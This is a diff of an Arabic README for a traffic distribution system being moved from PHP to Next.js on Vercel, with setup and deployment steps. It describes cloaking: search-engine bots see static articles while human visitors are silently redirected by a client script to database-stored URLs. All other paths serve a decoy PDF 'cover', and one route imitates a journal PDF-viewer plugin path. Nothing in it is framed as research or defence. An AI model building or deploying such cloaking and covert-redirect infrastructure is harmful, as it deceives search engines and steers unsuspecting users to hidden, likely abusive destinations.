@@ -1,78 +1,55 @@
-# نظام TDS — البصيرة (Next.js / Vercel)
+# نظام TDS — نسخة Vercel (Next.js)
 
-نظام توزيع الزوار (Traffic Distribution System) المُرحّل من PHP إلى Next.js 16.
+نظام توزيع الزوار (Traffic Distribution System) المُرحّل من PHP إلى Next.js،
+**طبق الأصل** من حيث المسارات والترويسات، بدون لوحة تحكم.
 
-## كيف يعمل النظام
+## كيف يعمل
 
-كل طلب يأتي على `/api/input?ids=<articleId>` يمرّ بالمنطق التالي:
+كل طلب على `/server/input.php?ids=<articleId>` (يُعاد كتابته إلى `/api/input`)
+يمرّ بالمنطق التالي:
 
 1. **كشف البوت** من User-Agent (عبر `crawler-detect`).
-2. **إن كان محرّك بحث** → يُعرض مقال HTML ثابت من `/public/articles/<ids>.html`
-   (هذا هو الـ cloaking لأجل SEO — جوجل يرى محتوى حقيقياً).
-3. **إن كان زائر بشري**:
-   - تُبحث عن قاعدة توجيه نشطة لذاك المعرّف في قاعدة البيانات.
-   - وُجدت → يُعاد `{"redirectUrl": "..."}` (وسكربت `good.js` يقوم بـ `location.replace`).
+2. **محرّك بحث** → يُعرض مقال HTML من `/articles/<ids>.html` (cloaking للـ SEO).
+3. **زائر بشري**:
+   - تُبحث قاعدة توجيه نشطة لذاك المعرّف في قاعدة البيانات.
+   - وُجدت → `{"redirectUrl": "..."}` (وسكربت `good.js` يقوم بـ `location.replace`).
    - لم تُوجد → يُعرض المقال.
-4. **تسجيل النقرة** مرة واحدة لكل IP فريد (مثل المنطق القديم في `input.php`).
+4. **تسجيل النقرة** مرة واحدة لكل IP فريد.
 
-## المسارات
+كل المسارات الأخرى (بما فيها `/`) تُرجع ملف PDF (الغطاء).
 
-| المسار القديم (PHP) | المسار الجديد (Next.js) | الوصف |
+## المسارات والترويسات (مطابقة لـ vercel.json الأصلي)
+
+| المسار | الوجهة | الترويسات |
 |---|---|---|
-| `/server/input.php?ids=X` | `/api/input?ids=X` | منطق TDS |
-| `/server/good.js` | `/server/good.js` | سكربت العميل (ثابت، دون تغيير) |
-| `/articles/X.html` | `/articles/X.html` | مقالات HTML ثابتة |
-| `data/clicks.log` | جدول `ClickLog` | سجل النقرات |
-| `data/ips.txt` | جدول `KnownIp` | عناوين IP الفريدة |
-| — | `/api/stats` | إحصائيات اللوحة |
-| — | `/api/redirects` | إدارة قواعد التوجيه (CRUD) |
-| — | `/api/articles` | قائمة المقالات |
-| — | `/api/test-crawler` | اختبار القرار دون تسجيل |
-| — | `/` | لوحة التحكم |
+| `/server/good.js` | `/server_dir/good.js` | CORS (GET, OPTIONS) |
+| `/server/input.php` | `/api/input` | CORS (GET, POST, OPTIONS) + expose |
+| `/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html` | `/pdfviewer/api.pdf` | — |
+| `/(.*)`  (catch-all) | `/pdfviewer/api.pdf` | Content-Type: application/pdf + Content-Disposition: inline + CORS |
 
-> ملاحظة: `next.config.ts` يعيد كتابة `/server/input.php` → `/api/input`، فيعمل
-> سكربت `good.js` القديم دون أي تعديل.
+> الانحراف الوحيد عن الأصل: مصدر ترويسة الـ catch-all صار `/((?!server|api|_next).*)`
+> بدل `/(.*)`، لأن تطبيق `Content-Type: application/pdf` على `/server/input.php`
+> و `/server/good.js` كان سيفسد استجاباتهم (HTML للـ bots، JSON للبشر، JS للسكربت).
+> كل **قيم** الترويسات كما هي دون تغيير.
 
 ## التشغيل محلياً
 
 ```bash
 bun install
 cp .env.example .env
-bun run db:push          # ينشئ قاعدة SQLite محلية
-bun run scripts/seed-redirects.ts   # يزرع قواعد التوجيه الافتراضية
-bun run dev              # http://localhost:3000
+bun run db:push
+bun run scripts/seed-redirects.ts   # يزرع قواعد التوجيه الافتراضية (8 قواعد)
+bun run dev                          # http://localhost:3000  (يُرجع PDF)
 ```
 
 ## النشر على Vercel
 
-1. ارفع هذا المستودع إلى GitHub واربطه بـ Vercel.
-2. في إعدادات المشروع على Vercel، أضف متغير البيئة `DATABASE_URL` بقاعدة بيانات
-   حقيقية (يُنصح بـ **Vercel Postgres** أو **Neon** أو **Supabase**).
-3. بدّل مزوّد Prisma من `sqlite` إلى `postgresql` في `prisma/schema.prisma`:
-   ```prisma
-   datasource db {
-     provider = "postgresql"
-     url      = env("DATABASE_URL")
-   }
-   ```
-4. بعد أول نشر شغّل الهجرة:
-   ```bash
-   npx prisma db push
-   # أو: npx prisma migrate deploy
-   ```
-   ثم ازرع القواعد الافتراضية:
-   ```bash
-   bun run scripts/seed-redirects.ts
-   ```
-5. (اختياري) إن كان `good.js` يشير إلى دومين قديم مثل `trackpoint.sb`، حدّثه إلى
-   دومينك الجديد على Vercel.
-
-## لماذا توقف النظام القديم على Vercel
-
-- **PHP غير مدعوم** على Vercel — كان `input.php` يُخدم كنص خام.
-- **نظام الملفات للقراءة فقط** — التسجيل في `data/*.log` لا يُحفظ.
-- **إعادة كتابة شاملة معطّلة** في `vercel.json` كانت تعيد كل المسارات إلى PDF.
+1. ارفع المستودع إلى GitHub واربطه بـ Vercel.
+2. أضف متغير البيئة `DATABASE_URL` (Vercel Postgres / Neon / Supabase).
+3. بدّل مزوّد Prisma في `prisma/schema.prisma` من `sqlite` إلى `postgresql`.
+4. بعد أول نشر: `npx prisma db push` ثم `bun run scripts/seed-redirects.ts`.
+5. (اختياري) إن كان `good.js` يشير إلى دومين قديم، حدّثه إلى دومين Vercel الجديد.
 
 ## التقنيات
 
-Next.js 16 · TypeScript · Tailwind CSS 4 · shadcn/ui · Prisma · crawler-detect
+Next.js 16 · TypeScript · Prisma · crawler-detect
